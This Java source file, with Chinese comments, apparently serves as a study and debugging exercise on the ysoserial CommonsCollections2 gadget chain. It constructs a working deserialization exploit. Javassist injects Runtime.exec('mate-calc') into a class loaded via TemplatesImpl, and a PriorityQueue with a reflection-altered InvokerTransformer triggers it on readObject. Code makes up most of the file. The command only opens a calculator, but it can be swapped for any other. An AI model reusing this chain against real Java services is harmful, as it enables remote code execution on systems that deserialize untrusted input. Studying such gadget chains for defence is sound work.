package com.example.apache_collections;


import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import javassist.*;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.apache.xalan.xsltc.compiler.Template;
import org.apache.xalan.xsltc.trax.TemplatesImpl;

import javax.swing.text.DefaultEditorKit;
import java.io.*;
import java.lang.reflect.Field;
import java.util.Comparator;
import java.util.PriorityQueue;
import java.util.Queue;

public class CommonCollections2 {
    /*
    这是对 https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections2.java
    的分析与调试

    由注释可以看到, 依赖了commoncollection 4.0
    先将依赖导到maven的pom.xml中,
    <dependency>
        <groupId>org.apache.commons</groupId>
        <artifactId>commons-collections4</artifactId>
        <version>4.0</version>
    </dependency>

    然后看line:33, final Object templates = Gadgets.createTemplatesImpl(command);
    用到了TemplatesImpl类, 了解一下这个类
    [TemplatesImpl.java](https://github.com/JetBrains/jdk8u_jaxp/blob/master/src/com/sun/org/apache/xalan/internal/xsltc/trax/TemplatesImpl.java)
     说实话没怎么看懂这个类.. 先看一下ysoserail 是怎么创建的.

     在Gadget.`createTemplatesImpl`函数中, 调用 了`createTemplatesImpl(cmd, class, class, class)`函数,并值了
     ```
    Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl"),
    Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet"),
    Class.forName("org.apache.xalan.xsltc.trax.TransformerFactoryImpl"));
     ```

     然后实例化了第一个类,即 `TemplatesImpl.newInstance()`
     并通过调用 ClassPool, 插入了两个 类, 一个是静态类 `StubTransletPayload`
     另外一个是`AbstractTranslet`


     */

    public static class StubTransletPayload extends AbstractTranslet implements Serializable {

        private static final long serialVersionUID = -5971610431559700674L;


        public void transform(DOM document, SerializationHandler[] handlers) {
        }

        @Override
        public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) {
        }
    }

    public static class Foo implements Serializable {

        private static final long serialVersionUID = 8207363842866235160L;
    }


    public static void main(String[] args) throws ClassNotFoundException, IllegalAccessException, InstantiationException, NotFoundException, CannotCompileException, IOException, NoSuchFieldException {
        /*
        // 第一步我们用自己的反射方法将poc复现了, 现在应该是找一个调用了 getOutputProperties
        // 并且可调用translaetimple的地址 , ysoserial 给的是PriorityQueue
        Class tplClass =  Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl");
        Class abstTranslet = Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet");
        Class transFactory = Class.forName("org.apache.xalan.xsltc.trax.TransformerFactoryImpl");
        Object template =  tplClass.newInstance();

        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(StubTransletPayload.class));
        pool.insertClassPath(new ClassClassPath(abstTranslet));

        final CtClass clazz = pool.get(StubTransletPayload.class.getName());

        String cmd = "java.lang.Runtime.getRuntime().exec(\"mate-calc\");";
        clazz.makeClassInitializer().insertAfter(cmd);
        clazz.setName("ysoserial.Pwner" + System.nanoTime());
        CtClass superC = pool.get(abstTranslet.getName());
        clazz.setSuperclass(superC);

        final byte[] classBytes = clazz.toBytecode();
        Field bytecodes = tplClass.getDeclaredField("_bytecodes");
        // 由于_bytecodes是private属性,需要 设置 Access = TRue
        bytecodes.setAccessible(true);
        // bytecodes 是 [][] 类型的,所以要加另外一个类,即上边的FOO
        // 我们把它的classfiles类拿过来用一下
        bytecodes.set(template, new byte[][]{classBytes, com.example.apache_collections.ClassFiles.classAsBytes(Foo.class)});

        Field name = tplClass.getDeclaredField("_name");
        name.setAccessible(true);
        name.set(template, "Pwnr");

        Field tfactory = tplClass.getDeclaredField("_tfactory");
        tfactory.setAccessible(true);
        tfactory.set(template, transFactory.newInstance());

        TemplatesImpl t = (TemplatesImpl)template;
        //newTransformer() 函数的调用
        t.getOutputProperties();
        return;

         */


        //调用PriorityQueue来执行命令
        //https://github.com/frohoff/jdk8u-jdk/blob/master/src/share/classes/java/util/PriorityQueue.java
        //在PriorityQueue中, 有构造函数PriorityQueue(int, Comparator)
        //并在siftDownUsingComparator/siftUpUsingComparator 两个函数中调用了
        //而siftUp调用了sifteUpUsingComaparaotr, `Inserts item x at position k, maintaining heap invariant by`
        //    @SuppressWarnings("unchecked")
        //    private void heapify() {
        //        for (int i = (size >>> 1) - 1; i >= 0; i--)
        //            siftDown(i, (E) queue[i]);
        //    }
        //在插入的时候会调用
        // 在readObject时会调用 `heapify()`

        //而在 `TransformingComparator` 中,实现了Comparator的接口,并在调用 compare函数中使用了`transform`, 就可以完成了
        //```
        //        public int compare(final I obj1, final I obj2) {
        //            final O value1 = this.transformer.transform(obj1);
        //            final O value2 = this.transformer.transform(obj2);
        //            return this.decorated.compare(value1, value2);
        //        }
        //```
        // this.compare可以通过构造函数来实现
        //        ```
        //            public TransformingComparator(final Transformer<? super I, ? extends O> transformer) {
        //            this(transformer, ComparatorUtils.NATURAL_COMPARATOR);
        //        }
        //        ```
        // 而transformer可以由上一节是 invokeTransforms来使用
        //
        // 这也是commoncollections2中的实现过程.

        // 如果不加这个, 会显示int类型无此方法
        //

        Class tplClass =  Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl");
        Class abstTranslet = Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet");
        Class transFactory = Class.forName("org.apache.xalan.xsltc.trax.TransformerFactoryImpl");
        Object template =  tplClass.newInstance();

        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(StubTransletPayload.class));
        pool.insertClassPath(new ClassClassPath(abstTranslet));

        final CtClass clazz = pool.get(StubTransletPayload.class.getName());

        String cmd = "java.lang.Runtime.getRuntime().exec(\"mate-calc\");";
        clazz.makeClassInitializer().insertAfter(cmd);
        clazz.setName("ysoserial.Pwner" + System.nanoTime());
        CtClass superC = pool.get(abstTranslet.getName());
        clazz.setSuperclass(superC);

        final byte[] classBytes = clazz.toBytecode();
        Field bytecodes = tplClass.getDeclaredField("_bytecodes");
        // 由于_bytecodes是private属性,需要 设置 Access = TRue
        bytecodes.setAccessible(true);
        // bytecodes 是 [][] 类型的,所以要加另外一个类,即上边的FOO
        // 我们把它的classfiles类拿过来用一下
        bytecodes.set(template, new byte[][]{classBytes, com.example.apache_collections.ClassFiles.classAsBytes(Foo.class)});

        Field name = tplClass.getDeclaredField("_name");
        name.setAccessible(true);
        name.set(template, "Pwnr");

        Field tfactory = tplClass.getDeclaredField("_tfactory");
        tfactory.setAccessible(true);
        tfactory.set(template, transFactory.newInstance());

        //如果这里设置为newTransformer, 则会抛出错误, 因为int类型是无法调用newTransformer的
        // 所以要先设置成toString, 然后再用反射设置成newTransformer,
        // 至于为什么设置完后不会触发, 应该是在设置完后,不会直接调用排序
        // 而且在于,如果直接add一个参数,这个数必须是可以直接调用 compare.tranlate的, 比如queue.add(template)
        // 而不能是queue.add(1) `The method 'newTransformer' on 'class java.lang.Integer' does not exist`

        Transformer trans = new InvokerTransformer("toString", new Class[0], new Object[0]);
        Comparator comparator = new TransformingComparator(trans);

        Queue queue = new PriorityQueue<Object>(2, comparator);
        queue.add(1);
        queue.add(1);

        Field field = InvokerTransformer.class.getDeclaredField("iMethodName");
        field.setAccessible(true);
        field.set(trans, "newTransformer");
//        field.set(trans, "getOutputProperties");

        //测试可以直接执行
        //trans.transform(template);

        Field field2 = PriorityQueue.class.getDeclaredField("queue");
        field2.setAccessible(true);
        Object[] queueArray = (Object[]) field2.get(queue);
        queueArray[0] = template;
        queueArray[1] = 1;

        byte[] a = do_serialize(queue);
        Object b = do_unserialize(a);

    }


    public static byte[]  do_serialize(Object obj) throws IOException {
        ByteArrayOutputStream btout = new ByteArrayOutputStream();

        ObjectOutputStream oos = new ObjectOutputStream(btout);
        oos.writeObject(obj);
        System.out.println("do serialized success");
        return btout.toByteArray();
    }

    public static Object do_unserialize(byte[] data) throws IOException, ClassNotFoundException {
        ByteArrayInputStream btin = new ByteArrayInputStream(data);
        ObjectInputStream ooi = new ObjectInputStream(btin);

        System.out.println("do unserialized success");
        return ooi.readObject();
    }

}
